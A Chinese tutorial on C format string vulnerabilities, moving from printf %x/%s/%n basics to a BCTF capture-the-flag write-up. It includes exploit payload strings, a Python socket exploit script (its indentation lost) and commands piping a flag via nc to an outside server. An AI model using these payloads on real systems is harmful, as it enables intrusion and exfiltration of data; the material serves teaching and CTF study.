

格式化字符串漏洞危害一点不比栈溢出漏洞的危害小，如果使用得当，甚至比栈溢出效果更好。利用方式主要有2种：

\1. 打印内存

使用%f%f%f%d%x等可以打印栈上数据，使用%s可以打印栈上指针指向的内存内容。

printf可以打印出调用者栈帧中的信息。在二进制漏洞利用当中，获得内存中的数据是非常重要的一个技巧，而格式化字符串漏洞的其中一个利用方法便是能够获得内存中那些本不应该被我们知道的数据。这个过程我们称之为leak内存。二进制漏洞利用中一种重要的方法ret to libc就是以leak基地址为前提的。

只要我们在format中填入足够的参数，那么printf就可以打出储存在栈中的，那些本不能被知道的信息。只要计算好format在栈中的地址与需要leak的信息地址之差。就可以得到想要的数据。

例如，在栈上，格式化字符串地址在0x20处而我们想要获取的数据地址在0x00处。之间一共相差32个字节，那么我们就可以构造"%f%f%f%d,%x"这样的字符串。逗号前面会的"%f%f%f%d"可以打印出比格式化字符串更高位的28个字节的数据，当然打印的这些数据不是我们需要的，我们只是需要最后的一个%x帮我们输出的以16进制的形式打印出的数据。

更进一步，我们知道格式化字符串还有%s参数。如果在栈中保存有指向我们感兴趣数据的指针，我们就可以在打印指针的时候使用一个%s来打印别的地方的内容。而且一般的程序都会将用户输入的数据储存在栈上。这就给了我们一个构造指针的机会，再结合格式化字符串漏洞，几乎可以得到所有内存数据。



\2. 修改内存

使用"%n"修改栈上指针指向的内存内容。

格式化字符串其实也可以修改内存中的数据，使用"%n"就可以做到。

我们来看看下面这一段代码。

\#include <stdio.h>

int main(void)

{

​	int a;

​	printf("aaaaaaa%n\n",&a);

​	printf("%d\n",a);

​	return 0;

}

可以发现a的值被printf函数修改为了7。这就是%n的功效了。这是一个不常用到的参数。它的功能是将%n之前printf已经打印的字符个数赋值给传入的指针。通过%n我们就可以修改内存中的值了。和%s泄露内存一样，只要栈中有我们需要修改的内存的地址就可以使用格式化字符串的漏洞修改它。

当然，如果需要修改的数据是相当大的数值时，我们可以使用%02333d这种形式。在打印数值右侧用0补齐方式来补足位数。

可以看出，格式化字符串可以修改的内存范围更加广。只要构造出指针，就可以改写内存中的任何数值。和栈溢出的地毯轰炸不同。这种一次只能改写一个dword大小的内存的攻击方式更加精而致命







格式化字符串漏洞是由于printf\sprintf\fprintf一类函数的格式化字符串漏洞用户可控导致的。

格式化字符串漏洞可控的情况下，可以用来读取内存内容导致信息泄露，可以用于绕过ASLR。另外也可以造成内存写入，从而控制程序执行流程。



会触发该漏洞的函数很有限。主要就是printf还有sprintf，fprintf等等c库中print家族的函数。 

printf的函数声明如下：

int printf(const char* format,...)

参数先是一个字符串指针，它指向的一个format字符串。后面是个数可变的参数。

printf("%s", str);

这个程序没有问题。然后会有一些人为了偷懒会写成这种样子

printf(str);

这个程序在printf处用了一种偷懒的写法。这看起来是没有什么问题。但是如果str字符串是由用户直接或间接输入的，就产生了一个非常严重的漏洞。

千万不要将printf中的format字符串的操纵权交给用户。保证printf函数的第一个参数是不可变的，在程序员的掌握中的。



64位上printf函数的行为发生了许多变化。这里暂时不进行说明。不过如果清楚了漏洞的产生原因，依然可以使用此漏洞。



\#include <stdio.h>

int main(void)

{

​	printf("%d%d%d%d%s",5,6,8,0x21,"test");

​	return 0;

}



对应汇编代码如下：

.data

str   db "test",0

format db "%d%d%d%d%s",0



.code

push  str

push  21h

push  8

push  6

push  5

push  format

call  printf

对应栈结构如下：

-00000003         db ? ;

-00000002         db ? ;

-00000001         db ? ;

+00000000 s       db 4 dup(?)

+00000004 r       db 4 dup(?)

+00000008 format     db 4    ;"%d%d%d%c"

+0000000c %d       db 4    ; 4

+00000010 %d       db 4    ; 6

+00000014 %d       db 4    ; 8

+00000018 %x       db 4    ; 0x21

+0000001c %s       db 4    ; "test"

+0000001c ; end of stack variables



根据cdecl的函数调用规定，函数的从最右边的参数开始，逐个压栈。如果要传入的是一个字符串，那么就将字符串的指针压栈。这一切都井井有条的进行着。如果是一般的函数，函数的调用者和被调用者都应该知道函数的参数个数以及每个参数的类型。对于不相同的类型，编译器还会自动的进行类型的转换，或者是发生编译错误，提醒程序的编写者。但是到了printf函数，一切就不一样了。因为printf是c语言中少有的支持可变参数的库函数。对于可变参数的函数，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。

当然这会产生一个严重的问题。如果我们无意或者有意，在format中，或者说我们要求printf打印的数据数量大于我们所给的数量会怎样？printf函数不可能知道栈帧中哪一些数据是传入它参数，哪些是属于函数调用者的数据。看下面段代码

\#include <stdio.h>

int main(void)

{

​	printf("%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x");

​	return 0;

}

这里我们只给了printf一个参数，却让其打印出12个int类型的数据，我们编译运行看看会有什么结果。这里可以看到，printf忠实的按照我们意愿打印出了12个数值。这些数值不是我们输入的参数，而是保存在栈中的其他的数值。通过这个特性，黑客们就创造出了格式化字符串的漏洞。



下面是一个简单实例：



\#include <stdio.h>

int main(void)

{

​	int flag = 0;

​	int *p = &flag;

​	char a[100];

​	scanf("%s",a);

​	printf(a);



​	if(flag == 2000)

​	{

​		printf("good!!\n");

​	}

​	return 0;

}



如上代码，32位编译，由于当前是64位环境，编译32位应用gcc需加-m32参数，同时要先确保安装如下两个软件包：

apt-get install gcc-multilib

apt-get install libc6-dev-i386

gcc -m32 format.c -o format



可以看到代码中格式化字符串内容可以控制。要达到flag验证通过的目的，需要借助格式化字符串漏洞，将flag的值改写成2000即可。

首先gdb调试。执行到printf代码调用处：

  0x804852a <main+61>: mov  DWORD PTR [esp],eax

=> 0x804852d <main+64>: call  0x8048390 <printf@plt>

  0x8048532 <main+69>: mov  eax,DWORD PTR [esp+0x10]

看下此时的栈结构：

0000| 0xffffd4a0 --> 0xffffd4b8 ("%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x")

0004| 0xffffd4a4 --> 0xffffd4b8 ("%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x")

0008| 0xffffd4a8 --> 0x2c0003f

0012| 0xffffd4ac --> 0x0

0016| 0xffffd4b0 --> 0x0

0020| 0xffffd4b4 --> 0xffffd4b0 --> 0x0

0024| 0xffffd4b8 ("%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x")

0028| 0xffffd4bc ("8x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x")

可以看出，esp=0xffffd4a0，栈顶存储的是格式化字符串地址，即printf的参数。

0xffffd4b0即是flag变量

0xffffd4b4即是指针p变量，它存储了一个地址指向flag变量。

首先构造格式化字符串：%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x,%0x08x

将依次打印

0xffffd4b8,0x02c0003f,0x00000000,0x00000000,0xffffd4b0..

如果我们想要输出第5个指针指向的内容，将其改成%s即可：

%0x08x,%0x08x,%0x08x,%0x08x,%s

当然这里指针指向的值为0，所以输出的对应位置为空：

0xffffd4b8,0x02c0003f,0x00000000,,0xffffd4b0..

下面的目的是将第5个参数位置改写成2000

思考一下，首先构造成：

%08x%08x%08x%08x%n

这样前面4个参数依次被打印，因为要改的是第5个参数，所以第5个格式化字符指定为%n

这样前四个字符串明显占用32个字符，这样第5个参数位置即指针指向的flag被改写为32还不够，需要调整下：

%08x%08x%08x%01976x%n

这样构造之后，前4个参数输出字节数刚好是8+8+8+1976=2000，所以第5个参数指针指向的flag变量将被改写成2000

执行结果如下：

$ ./format

%08x%08x%08x%01976x%n

ffbbe39802c0003f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000good!!

可以看到成功输出good



当然为了计算简便，也可以是%010x%010x%010x%01970x%n









printf类函数有：printf, fprintf, sprintf

通常由两种写法：

printf("%s", str);

printf(str);

但是针对第二种写法如果我们在str中指定了格式化字符串参数却不给它提供额外的更多参数情况下将会输出什么呢。

先来看看printf的输出机制：

printf("%s is %d years old.\n", name, age);

它的栈是这样的(向上是高地址)：

STACK:  ^

​     |

​     |   value of age

​     |   value of name (as it's a pointer, it's an address)

​     |   address of the format string

​     |

再看一个示例程序：

\---------------------------------------

\#include <stdio.h>

\#include <string.h>



int main(int argc, char **argv)

{

 char tmp[256];



 if (argc == 2)

 {

  // Yeah, let's be secure here (sic!)

  strncpy(tmp, argv[1], sizeof(tmp));

  printf(tmp);

 }

 else

 {

  printf("Syntax: %s \n", argv[0]);

 }



 return 0;

}

\---------------------------------------

它接收一个字符串，printf输出，这个字符串用户可控，可以指定为一系列格式化字符串：



$ ./fs %s%s%s%s%s%s%s%s

Segmentation fault

出现这个原因是因为printf试图去读取一个不存在或受保护的内存地址。下面尝试dump一下栈空间：

$ ./fs "%p %p %p %p"

0xff974120 0x100 0xff9735f4 0x8048322

结合前面的代码，我们可以知道，只要有足够的格式化字符串，就有可能读取到栈上的tmp变量:

$ ./fs "AAAA%p %p %p %p %p %p %p"

AAAA0xffb61119 0x100 0xffb5ff84 0x8048322 0xf74293d0 0xf741feb0 0x41414141

可以看到最后的值刚好对应格式化字符串本身的前4个字节。这么说我们只要把前面的AAAA替换成一个指定的地址，再把%p替换成%s(因为%s将栈上的值当做字符串指针来用，获取指针指向的内容)就可以读取任意地址的内存了。当然在格式化字符串里写太多的格式化字符串有的繁琐，完全可以用一种简写方式来代替：

$ ./fs 'AAAA%7$p'

AAAA0x41414141

这个格式化字符串AAAA%7$p的意思就是获取第7个参数并将它作为%p来解析。

那如何来实现任意地址写呢，格式化字符串"%n"允许将当前输出的字符数存储到指定的特定参数中去。现在修改如下调用：

$ ./fs 'AAAA%7$n'

Segmentation fault

现在程序试图将整数"4"写入地址0x41414141，但由于该地址没有映射导致报了segfault。写入一个小的整数似乎没太大意义，但如果不用手工输出太多字符来增大写入的值呢，可以借助格式化字符串的padding特性完成：

$ ./fs 'AAAA%150u%7$n'

Segmentation fault

程序试图写入150到地址0x41414141。“%150u”用于将一个数字用空格扩充使其输出至少150字符。现在的问题是找到一个方法能够用这种方式输出特别大的整数(例如一个地址)出来。

第一种想到的方法是将一个32位地址一字节一字节的写入，通过4次完成。例如写入0xDDCCBBAA到0x41414141，可以用如下输入即可实现：

$ ./fs 'AAAABAAACAAADAAA%154u%7$n%17u%8$n%17u%9$n%17u%10$n'

Segmentation fault

解释一下，AAAABAAACAAADAAA输出16个字符，所以第一次写操作写入0x000000AA到0x41414141，还需再扩展154字节。考虑到小端方式，0xAA将被写入到0x41414141上，0x00将依次被写入到0x41414142到0x41414144上。下一个写操作写入0x000000BB到0x41414142上，加上之前的170个字符需要再扩展17个(187=0xBB)，如此下去完成第三和第4次写操作。同时由于第四次的写操作，将导致0x41414145至0x41414148的内容被0x00填充，覆盖掉它们本身存储的内容。

在上面的操作中有一个特点，写入的值0xAA、0xBB、0xCC、0xDD是依次增大的，而我们每次输出的字符个数也是增大的，所以这个场景是可用的。但如果4次写入的值中后一次大小小于前一次，例如0xDDBBCCAA，怎么办呢。这种情况下后一次的写入操作必定会覆盖前一次的写入操作。考虑如下的写入方式：

$ ./fs 'AAAABAAACAAADAAA%154u%7$n%34u%8$n%239u%9$n%34u%10$n'

Segmentation fault

写入0x000000CC后，我们可以通过写入0x1BB(即443)将写0xBB到0x41414143，其中写入到0x41414144的0x01字节将被接下来的写操作覆盖。

除了%n，还有另一种格式化字符串%hn允许一次仅将输出字符串写进两个字节空间。这将提高地址写入操作的构造效率，这样我们就只需两步操作，且不会导致接下来的写操作覆盖掉之前的写入。0xAABBCCDD的例子就可以这样实现：

$ ./fs 'CAAAAAAA%43699u%7$hn%8738u%8$hn'

Segmentation fault

这样第一个写操作写入0xAABB到地址0x41414143(考虑小段情况)，第二个写操作将0xCCDD写入0x41414141地址

现在考虑下面的实例：

\---------------------------------

\#include <stdio.h>

\#include <string.h>



int main(int argc, char **argv)

{

 char tmp[256];

 char pwd_ok = 0;



 if (argc == 2)

 {

  strncpy(tmp, argv[1], sizeof(tmp));



  if (!strncmp(tmp, "gb_master", 9))

  {

   pwd_ok = 1;

  }

  else

  {

   char buffer[1024];



   strncpy(buffer, argv[1], sizeof(buffer));

   strcat(buffer, " is not the correct password\n");



   // The vulnerability, of course

   printf(buffer);

  }



  if(pwd_ok != 0)

  {

   printf("Here's a cookie, for you!\n");

  }

 }

 else

 {

  printf("Syntax: %s <password>\n", argv[0]);

 }



 return 0;

}

\---------------------------------

通过阅读代码，整个验证流程的关键就是变量pwd_ok的值。如果我们能够修改它的值，我们将能获取到cookie。通过gdb调试我们可以获取到pwd_ok变量的地址，在我的PC上该地址为0xFFFFC9F8，由于我们可以通过变量的地址写入任意值到该变量，所以通过如下的格式化字符串即可取得cookie：

$ ./fs "$(python -c 'import sys; sys.stdout.write("\xF8\xC9\xFF\xFF%7$n

???? is not the correct password

Here's a cookie, for you!

格式化字符串能做的不止这些，我们还可以做更复杂的事情，例如构造一个栈来进行函数的调用完成其他的目的。



关于格式化字符串漏洞的历史：

The first format string vulnerability was found by Miller, Fredriksen and So during a fuzz test on the csh shell in December 1990, when they published the results of the analysis on the paper “An Empirical Study of the Reliability of UNIX Utilities“(ftp://ftp.cs.wisc.edu/paradyn/technical_papers/fuzz.pdf). However, this type of vulnerability remained silent for almost ten years. This silence was broken by Tymm Twillman, who discovered a vulnerability inside the ProFTPD daemon code in September 1999 and published his analysis on Bugtraq(http://seclists.org/bugtraq/1999/Sep/328). This was only the beginning because, not much time later, the attention was focused on WU-FTPD, as Przemyslaw Frasunek(http://seclists.org/bugtraq/2000/Jun/312) and tf8(http://seclists.org/bugtraq/2000/Jun/297) started publishing working exploits for similar vulnerabilities.

Format string attacks definitely gained popularity in these months and it was time to analyse how they worked in a proper way. The paper containing the results is “Format String Attacks“(http://www.thenewsh.com/~newsham/format-string-attacks.pdf), published by Timothy Newsham in September 2000.

In May 2001 Cowan, Barringer, Beattie and Kroah-Hartman proposed a defense from the format string attacks: FormatGuard(https://www.usenix.org/legacy/events/sec01/full_papers/cowanbarringer/cowanbarringer.pdf). This approach consisted into transforming all these format functions into equivalent macros: each macro would count the number of arguments passed to the function and compare this number to the number of specifiers inside the format string. If these numbers mismatched, then the program would abort. However, this approach was based on static analysis and, so, covered only a small part of the problem.

At last, a paper describing how to exploit these scenarios was published by scut (member of TESO) in September 2001: “Exploiting Format String Vulnerabilities“(https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf). This paper really describes the problem, the possible cases and all the different techniques appliable to each of them.

In 2002 it was time for “Advances in format string exploitation“(http://www.phrack.org/issues/59/7.html), in which gera and riq explained some tricks on how to speed up the format string exploitation and some techniques for heap-based format string attacks. Then, in 2010, Captain Planet’s article “A Eulogy for Format Strings”(http://phrack.org/issues/67/9.html) appeared on Phrack, explaining how to bypass the mitigation techniques that were implemented in the meanwhile.

















### 示例 BCTF

示例程序：

目标程序通过socket与用户交互

程序同下面print_out函数输出一段字符串，通过socket的fd发送给用户，其中v3 + 96指向该字符串，该字符串用户可控

print_out(fd, "Subject: %s\n", v3 + 32);

print_out(fd, (char *)(v3 + 96));



print_out函数实现如下：

int print_out(int fd, char *format, ...)

{

 char *s; // ST1C_4@1

 int n; // ST18_4@1

 ssize_t v4; // ST14_4@1

 va_list va; // [sp+38h] [bp+10h]@1



 va_start(va, format);

 s = (char *)malloc(maxlen);		// maxlen = 4096

 n = vsnprintf(s, maxlen, format, va);

 v4 = write(fd, s, n);

 free(s);

 return v4;

}





问题出在print_out(fd, (char *)(v3 + 96))这里，该函数直接把把输入当成格式化字符串来输出，而该字符串用户可控，造成格式化字符串漏洞。格式化字符串漏洞可以造成任意内存读写。

无法精确定位返回地址位置情况下，格式化字符串漏洞可以用来DUMP一些栈上的数据来算出返回地址在栈上的精确位置。

如果该可控字符串在栈上，在栈上能找到字符串自身，可采用在字符串头部填一个地址来修改任意地址内存的方法。用%n来写入，这种情况下需要在栈上指定写入地址。

但麻烦的是这里的字符串本来也是保存在malloc出的heap 段中。于是必须利用栈上已有的一些指针来达成目的，栈上必定有的指针是函数的返回地址以及在函数入口处压入栈中保存的ebp。返回地址指向了代码段，代码段不可写所以无法利用；而保存的ebp 就很有用了，ebp 都是指向一个栈上的地址，而这个地址中保存的通常也是一个上一层的ebp！也就是说可以利用第一个ebp通过%hhn来修改第二个ebp 的低两字节，使得第二个ebp 指向栈上任意我们想要的地址，再利用第二个ebp通过%hhn对其指向的地址写数据，也就是说我们拥有了把栈上任意地址的内存改成任意想要的值的能力！更进一步，利用上述能力可以构造出一个指向任意地址的指针，也就是说其实我们仍然拥有把任意内存地址修改成任意值的能力，只不过需要多花几个步骤而已！

这题的NX打开了，栈数据不可执行，所以shellcode 不可行，只能用ret-to-libc。而且服务器很可能开了ASLR，所以需要先通过格式化字符串DUMP 一些栈上的数据来算出返回地址在栈上的精确位置。不过还好程序是accept-fork型的，每次fork并不影响内存布局，所以可以多次连接来获取一些必须的信息。

本地调试该漏洞时，gdb attach附加上该进程，在需要断点的位置下断点，例如断在sprintf调用那里，需要设置set follow-fork-mode child，然后即可继续调试。





将可控字符串指定为"%08x %08x %08x ..(略).%08x %08x "即可dump内存，可以使用python脚本来发送更方便："%08x "*100

08b67c18 ff000a31

0xffb28cf0 ffb28d18 00000012 00000012 08b67bf8

0xffb28d00 ffb28d1c ffb28d1c ffb28d38 08048cbb

0xffb28d10 00000004 00000000 00000001 08b67c18

0xffb28d20 ffb28d48 0000001d 00000001 00000001

0xffb28d30 00000000 f7479894 ffb28d68 08048a98

0xffb28d40 00000004 08049340 00000000 00000000

0xffb28d50 ffb28d98 f779c840 00000000 00000003

0xffb28d60 00000000 ffb28d98 ffb28d98 080489be

0xffb28d70 00000004 0804896d 00000000 f7619000

0xffb28d80 ffb28dd8 000003e9 000003e9 0161ace0

0xffb28d90 00000000 ffb28dd8 ffb28dd8 0804915c

0xffb28da0 00000004 ffb28db8 ffb28db4 f7780921

0xffb28db0 f7786b10



找到栈上保存的ebp 就可以推测出栈地址，左侧一栏就是地址，利用这些地址就可以精确地修改函数返回地址。

然后需要利用程序中的输出函数(0x080491A2，即上面的print_out，在ida里地址就是0x080491A2)，打印出GOT表中某个libc函数的地址，比如这里fork()在GOT 表中的地址为0x804a9fc，其他任意一个libc函数都可，它只是用于定位的。



fork()在GOT 表中的地址为0x804a9fc，关于该地址的确定，可以在IDA中左侧函数列表点击fork进入extern段如下：跟随他的交叉引用got.plt:off_804A9FC，所在地址即是fork在got表里的地址0x804a9fc

extern:0804AAB0 ; __pid_t fork(void)

extern:0804AAB0         extrn fork:near     ; CODE XREF: _fork

extern:0804AAB0                     ; DATA XREF: .got.plt:off_804A9FC



.got.plt:0804A9FC off_804A9FC   dd offset fork     ; DATA XREF: _fork



确定了fork()在GOT 表中的地址，现在需要打印出这个地址里的内容，需要构造ret-to-libc:

首先需要将返回地址覆盖成print_out函数地址，然后还需要构造print_out函数调用的参数，第一个参数为fd，第二个参数为fork@GOT的地址，print_out会把这个地址里的内容当成字符串输出，得到后还需要用二进制查看器就能看到原始的地址数据。



在该程序的场景中，用户可重复(有限次)控制调用print_out打印用户可控格式化字符串。依次让print_out函数以如下格式化字符串为参赛进行调用，即可构造出所需ret-to-libc，在最后返回时进入构造的ret-to-libc流程打印出fork地址里的内容：

"%36204x%21$hn"

"%35403x%33$hn"		# 修改返回地址为0x8a4b，因为返回地址的高位本来就是0x0804 所以不用改

​			#0x08048a4b 这个地址是一句call print_out，这里不直接把返回地址填成print_out

​			#的入口是为了利用栈上之前压入的参数fd，作为print_out函数的第一个参数

"%36212x%21$hn"		#这里构造print_out 的第二个参数，直接填入fork@GOT 的地址，print_out会把这个地址里的内容当成字符串输出

"%43516x%33$hn"		#0xa9fc

"%36214x%21$hn" 

"%2052x%33$hn"		#0x0804

\#上述一系列print_out完成调用后，在这里退出之后会进到print_out 中，把fork在libc中的地址当成字符输出，用二进制查看器就能看到原始的地址数据，然后可以看到fork的地址为0xf7527320

然后需要分别确定fork和system函数在lib.so中的偏移，题目中提供了lib.so，IDA打开，双击左侧函数列表中的fork，即可调到fork入口，该地址即是fork在libc.so中的偏移。

fork在libc.so中的偏移为0xb7320

system在libc.so中的偏移为0x3ea70

于是可以算出system在内存中的地址为0xf74aea70



上面只是通过ret-to-libc获取了fork在内存的地址进而推算出system在内存的地址。下一步就要再次构造一个ret-to-libc调用system来完成命令的执行。

在构造实际的ret-to-libc之前还有一个问题，system()的参数怎么弄？

这个程序并没有使用重定向，所以直接system("/bin/sh")是没用的，不能得到一个可交互shell，那么可以执行system("cat flag|nc 202.120.7.104 1337")来将flag发送到我们自己的服务器上。

参数字符串需要先在内存的某个地方构造好，然后把字符串的地址当成参数传进去。但是这个程序中并没有全局的字符串变量，全局变量只有邮件数目(0x0804AA60)和一个指向实际邮件的指针数组(0x0804AA40)，而实际邮件中的内容都是保存在堆上，无法准确定位。

但是我们拥有把任意内存地址修改成任意值的能力，也就是说我们可以修改邮件数量。而程序在判断邮箱是否满的时候使用的是"==8"而不是">=8"，所以我们可以把邮件数量改成非常大，大到在新建邮件的时候访问邮件数组越界，且正好把邮件内容在堆上的地址写到栈上一个特定地址中，而邮件的内容中填上需要传递给system 的字符串参数，这样就可以在不知道字符串确切地址的情况下把其地址写到栈上，之后就可以当成参数传给system()。然后就可以构造实际的ret-to-libc攻击了，整个步骤比较复杂，中间还需要把邮件数清零以破除8封邮件的限制



依次让print_out函数以如下格式化字符串为参赛进行调用，即可构造出所需ret-to-libc，



"%36316x%21$hn"

"%43616x%33$hn"			# 将%62$指向0x0804aa60，即指向邮件数目变量地址

"%36252x%21$hn"

"%43618x%33$hn"			# 将%46 指向0x0804aa62，即指向邮件数目变量地址后两字节

"%36204x%21$hn"

"%60016x%33$hn"			# 0xea70, system在内存中的地址(0xf74aea70)的低字节

"%62$n"				# 邮件数清零

"%36206x%21$hn"

"%63306x%33$hn"			# 0xf74a, system在内存中的地址(0xf74aea70)的高字节

"%15851x%46$hn%15074x%62$hn\n"	# 将mail_num 改成所需的大小0x3deb78cd

​				# 0x0804aa40 + 0x3deb78cd * 4 = 0xffb28d74

​				# 注意高低字节都要改而且必须同时改

​				# 否则在改完第一个之后再进outbox 就会出错

最后构造一封邮件内容如下

"cat flag|nc 202.120.7.104 1337"

​				# system("cat flag|nc 202.120.7.104 1337")

当邮件写完，该邮件内容即字符串地址就会写到上面的栈地址0xffb28d74上，返回时作为system参数调用









另外一种写法，稍后理解了格式化字符串漏洞可以再理解下。。

基本思路和上面一样，不同的地方有：定位libc里的函数地址时，这里没有选择一个libc中的函数来定位，而是直接使用格式化字符串漏洞来dump栈内存，从中找到main返回到libc中的地址，根据该地址来定位，其实是一样的。

另外利用格式化字符串写栈上内存时所使用的格式化字符串不同，格式化字符串构造不唯一，理解原理再回头看吧。

第三，堆上的参数字符串的地址如何定位的，文章没说，需要看下下面的脚本理解

import socket

import struct

import sys

st = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

st.connect(('218.2.197.244',2337))

def S(x):

st.send(x+'\n')

def W(x,Show=True):

while True:

s = st.recv(4096)

if Show:

sys.stdout.write(s)

if x in s:

return s

W('Exit',False)

def FA(x,pad=True):

S('1')

S('.TO')

S('.SUB')

if pad:

S('[<({'+x+'})>]')

else:

S(x)

W('Exit',False)

S('3')

S('1')

s = W('Exit',False)

if pad:

s = s[s.find('[<({')+4:s.find('})>]')]

S('4')

S('1')

W('Exit',False)

return s

system = 0x3ea70-0x19993+0xf7489993

print 'system @ %08x'%system

print FA('%33$x'),FA('%34$x')

def WS(x,offset):

FA('%%%dc%%21$hhn'%(0x68+offset)) # write 33 (ffb28d68)

if ord(x)!=0:

FA('%%%dc%%33$hhn'%ord(x),pad=False) #write ffb28d6c+offset

else:

FA('%33$hhn',pad=False)

WS('\x70',0)

WS('\xea',1)

WS('\x4a',2)

WS('\xf7',3)

WS('\x78',8)

WS('\x8d',9)

WS('\xb2',10)

WS('\xff',11)

print '# sending cmd'

cmd = 'cat flag | nc our.server 13387; '

for i in range(len(cmd)):

WS(cmd[i],i+12)

print 'return to: '+FA('%34$x')

print 'arg1 = '+FA('%36$s')

S('5')

raw_input()















下面来分析下格式化字符串漏洞的读写细节：

依然是针对上面的函数

int print_out(int fd, char *format, ...)

使用"bctf%p %p %p %p %p %p %p %p %p %p %p %p"作为格式化字符串参数调用该函数

当函数执行到这里时，堆栈情况如下：

0000| 0xbffff320 --> 0x4

0004| 0xbffff324 --> 0x804cab0 ("bctf%p %p %p %p %p %p %p %p %p %p %p %p")

0008| 0xbffff328 --> 0x804ca70

0012| 0xbffff32c --> 0xbf000a32

0016| 0xbffff330 --> 0xbffff358

0020| 0xbffff334 --> 0x12

0024| 0xbffff338 --> 0x12

0028| 0xbffff33c --> 0x804ca50



其中栈顶两个地址是print_out的两个参数，fd和格式化字符串。这样打印出来的结果就是：

bctf0x804ca70 0xbf000a32 0xbffff358 0x12 0x12 0x804ca50...

即刚好把格式化字符串后面的栈内容打印出来了，实现了利用格式化字符串读栈内存的目的。



接下来是写内存，使用bctf%23c%1$n作为格式化字符串，当函数执行到这里时，堆栈情况如下：

0000| 0xbffff320 --> 0x4

0004| 0xbffff324 --> 0x804c948 ("bctf%23c%1$n")

0008| 0xbffff328 --> 0x804c908 --> 0x1b

0012| 0xbffff32c --> 0xbf000a31

0016| 0xbffff330 --> 0xbffff358

0020| 0xbffff334 --> 0xf

0024| 0xbffff338 --> 0xf

0028| 0xbffff33c --> 0x804c8e8

当sprintf将bctf%23c%1$n作为格式化字符串时，会导致将len(bctf)+23=27=0x1b写入到sprintf的第三个参数的内存中，即0xbffff328，而这里不存在第三个或更多参数。所以通过格式化字符串可以达到写内存的目的。









关于上面这个例子，还有第三种利用思路，利用格式化字符串漏洞达到了读写内存的目的，同时堆的内容可控。上面的两种方法都是使用了格式化字符串漏洞两次写栈内存来达到修改EIP的目的，进而构造栈上的ret-to-libc链来利用。另外一种思路是不这样直接修改EIP，由于可控数据都在堆上，可以直接在堆上构造ret-to-libc链，这一步很容易实现，然后让程序执行该ret-to-libc链，这就要求esp指向堆，而esp的值无法通过覆盖直接修改，可以转换下思路，上面说过，我们已经可以修改栈上的ebp，可以先让ebp指向堆上的地址，再通过程序后续可能会执行mov esp，ebp或leave等堆栈平衡的指令，来间接将esp指向堆区，进而有机会执行构造在堆上的ROP链。而此次堆区地址的确定，由于题目中将堆地址保存在了全局变量数组中，所以可以通过读取该内存地址来得到。注意，上面两种思路并没有通过读取该地址来定位，第一种思路是直接改写了邮件数来通过数组越界写，将该地址直接写在了栈上。

在栈上，ebp一般指向上一层的ebp，上一层ebp又指向上上层的ebp，现在通过格式化字符串漏洞，我们可以修改上上层的ebp(以及更往前的调用函数的ebp)，所以可以让上上层的ebp指向堆区数据，这时候在上上层函数返回的时候，执行的指令是mov esp，ebp或leave就可以达到修改esp使其指向堆数据的目的，如果这个值刚指向可以控制的堆区地址，最后ret将会使程序执行堆上的代码。由于程序开启了NX保护，但是PIE是关闭的，只要在堆上构造ROP，就可以绕过NX执行代码。不过还有一个问题需要解决，当修改了ebp成功之后，在mov esp，ebp或leave执行之前，可能有会涉及ebp的内存访问操作，例如mov eax, [ebp+fd]，这里原本是通过ebp获取栈上某个文件描述符的指令，修改ebp之后不仅要保证EBP所指向的内存可访问，又要保证EBP+fd 处的值是个正确的文件描述符，这就需要构造ebp所指向的堆数据，使这段操作不会产生内存访问异常。类似fd等这些需要构造的信息可以通过上面的格式化字符串读内存来获取。

梳理一下上述流程：

首先在可控的堆区上构造ROP链，并通过格式化字符串漏洞将上上层ebp指向堆区。

函数调用结束返回到上上层，执行leave;ret指令，使esp指向堆区ROP链，并执行代码。

另外有时候ROP链需要空间比较大，而堆区数据可能有限，这时候可以使用一些抬高ESP的gadgets来将ESP指向堆内更高的地址处，或许这部分可控堆空间更大呢。程序未开启PIE，可以在程序中使用gdb插件ropgadget或直接在gdb中命令搜索一些gadgets：

$ ropgadget

ret = 0x80486a2

popret =0x80486b9

pop2ret = 0x804930e

pop3ret = 0x804930d

pop4ret = 0x804930c

leaveret = 0x80488d8

addesp_12 = 0x80486b6

addesp_28 = 0x8049309



构造ROP 链的方法有很多种，其中最基本的形式如下

ROP_CHAIN = SYSTEM_Addr + EXIT_Addr + CMD_Addt + CMD

